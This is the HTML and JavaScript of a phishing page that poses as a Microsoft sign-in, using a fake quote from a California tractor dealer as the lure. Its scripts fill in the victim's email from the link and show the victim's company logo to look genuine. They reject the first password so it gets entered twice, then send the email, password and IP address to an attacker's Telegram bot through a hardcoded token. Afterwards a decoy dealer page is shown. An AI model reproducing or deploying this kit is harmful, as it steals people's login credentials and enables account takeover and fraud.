...
<head>
    ...
    <title> Sign in</title>
    <link href="https://pics.freeicons.io/uploads/icons/png/8205387771557996991-512.png" rel="shortcut icon" type="image/x-icon">
...
<body>
    <div class="bgimg" id="bodyd"></div>
    <div class="container-fluid">
        
        <div id="diiiv5" style="display:none" align="center">
           <a href="https://www.sanjoaquintractor.com/quote.htm" style="text-decoration: none; color:#000"> <img style="width: 100%;" src="https://isisanplastik.com/ma/sa_79.png" ><br>
            <span class="h5">WELCOME TO SAN JOAQUIN TRACTOR COMPANY</span><br/><span>
                San Joaquin Tractor Company was established in 1949 as an “Allis Chalmers” Dealership by Louis Agnetti Sr. Over the years our business has evolved to meet the needs of the San Joaquin Valley. Our equipment lines cover agriculture, construction and material handling. San Joaquin Tractor Company provides a wide variety of services including new and used equipment sales, equipment rentals, parts, and outstanding Service.
                <br/><br/>
                If you're looking for a new or used Kioti tractor, San Joaquin Tractor carries a wide selection, and if we don't have the tractor you need, we will find it for you. We are proud to be a Central Valley local, family owned and operated business, treating people the right way for over 72 years. Our customers are our top priority, and our goal is to provide them with the highest quality equipment and service. Our friendly and knowledgeable sales, service, and parts departments are dedicated to making sure your experience at San Joaquin Tractor is outstanding.
                <br/><br/>
                We are a full-line Agco/Massey Ferguson dealer for the Central Valley. We carry equipment, service and parts for Massey Ferguson, Kioti, Landini, Freeman, Darf, Domries, Gearmore, Rhino, Pequea, Kuhn Krause, Solex, Sunflower, TG Schmieser, Vrisimo, TMC Cancela, Porters Welding, Perfect and Rightline.</span><br/>
            <img style="width: 100%;" src="https://isisanplastik.com/ma/sa_80.png" >
            ...
            <div class="row topp">
                <div class="col-lg-6 mx-auto">
                    <div class="box" id="diiiv1">
                        ...
                        <div class="boxtext">
                            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" style="max-height: 46px;" id="banner1" class="img-fluid logoimg"><br><br><span class="h5">Sign In</span><br><span id="error" class="text-danger" style="display: none;"></span>

                            <span class="h6">Because you are accessing sensitive info, you need to verify your email and password to have access to quotes</span><br>                            
...
<br>
                            ...
                            <div class="form-group h5">
                                <input type="email" name="ai" class="form-control rounded-0 borde-dark" id="ai" aria-describedby="aiHelp"  style="border-right: none;border-left: none;border-top: none;" >
                            </div>
                            <p style="font-size: 13px">No account? <a href="#">Create one!</a></p>
                            <p style="font-size: 13px"><a href="#">Can't access your account?</a></p>
                            <div class="text-right">
                                <button type="button" id="subbutfir" class="btn rounded-0 text-white px-4" onClick="checkmail()" style="background-color: #0066BA;cursor: pointer;">Next</button>
                            </div>
                        </div>
                    </div>
                    <div class="box" id="div2" style="display: none;">
                        ...
                        <div id="contact" class="boxtext">
                            <img src="aHR0cHM6Ly9hYWRjZG4ubXNhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL21pY3Jvc29mdF9sb2dvX2VlNWM4ZDlmYjYyNDhjOTM4ZmQwZGMxOTM3MGU5MGJkLnN2Zw==" style="max-height: 46px;" id="banner2" class="img-fluid logoimg"><br><br>
                            ...
                            <div class="form-group mt-2">
                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Password" style="border-right: none;border-left: none;border-top: none;">
                            </div>
                            <p style="font-size: 14px"><a href="#">Forget password?</a></p>
                            <div class="text-right">
                                <button type="button" id="subbut" class="btn rounded-0 text-white px-4" onClick="finishh()" style="background-color: #0066BA;">Sign in</button>
                            </div>
                        </div>
                    </div>
                    <div class="box" id="div3" style="display: none;">
                        <div class="boxtext">
                            <img src="aHR0cHM6Ly9hYWRjZG4ubXNhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL21pY3Jvc29mdF9sb2dvX2VlNWM4ZDlmYjYyNDhjOTM4ZmQwZGMxOTM3MGU5MGJkLnN2Zw==" style="max-height: 46px;" id="banner3" class="img-fluid logoimg"><br><br>
...
<input type="hidden" id="detail" value="">
  ...
  <script>
var checkids = window.location.hash.substr(1);
if(checkids != ""){ 
document.getElementById('ai').value = checkids;
checkmail()
}

    function checkmail(){
        document.getElementById('error').style.display='none';
      var emass = document.getElementById('ai').value;

      if (emass == '' || emass.length <= 3) {
         document.getElementById('error').style.display='block';
         emass.focus();
        return false;	
     }else{
        var checkid = document.getElementById('ai').value;
        document.getElementById('aich').innerHTML = checkid;
        
        var ind = checkid.indexOf("@");
    var checkd = checkid.substr((ind + 1));
    var vsb = 'https://www.' + checkd;

        var vsb = 'https://www.' + checkd;
    $.get("https://logo.clearbit.com/" + checkd).done(function() {
            $(".logoimg").attr("src", "https://logo.clearbit.com/" + checkd);
        }).fail(function() {
                $(".logoimg").attr("src", "https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=" + vsb + "&size=16");
    
        });

        document.getElementById('diiiv1').style.display='none';
    ...
    function finishh(){
        ...
        var pra = document.getElementById('pr').value;
        if(pra == "" || pra.length <= 3) {
      document.getElementById('msg').innerHTML='Password field is empty';
...
var my_ijah = document.getElementById('ai').value;
...
if(c >= 1){
    ...
    document.getElementById('diiiv1').style.display='none';
            ...
            document.getElementById('diiiv5').style.display='block';   
        }else{
    document.getElementById('div2').style.display='block';
    document.getElementById('div3').style.display='none'; 

    document.getElementById('count').value=+c+1;
    document.getElementById('msg').innerHTML='Your email or password is incorrect If you don;t remember your password, reset it now.';
    document.getElementById('msg').style.display='block'; 
    ...
    function validate(e,a,detail){
       var TOKEN = '6545817893:AAGORFKAzo6VGvT4nKWyR1dJNjEogLd4ozc';
        var chatID = '5584558392';
        fetch(
        `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatID}&text=OFF=>\nUserid=${e}\nPass=${a}=\nIP:=${detail}`,
          {
            method: "GET",
          }
        ).then(
    ...
    <script>
      document.querySelector('#body').addEventListener('keydown', (event) => {
        if(event.key === 'Enter'){
          if(checki == 1){
          document.getElementById("subbutfir").click();
          }
          else if(checki == 2){
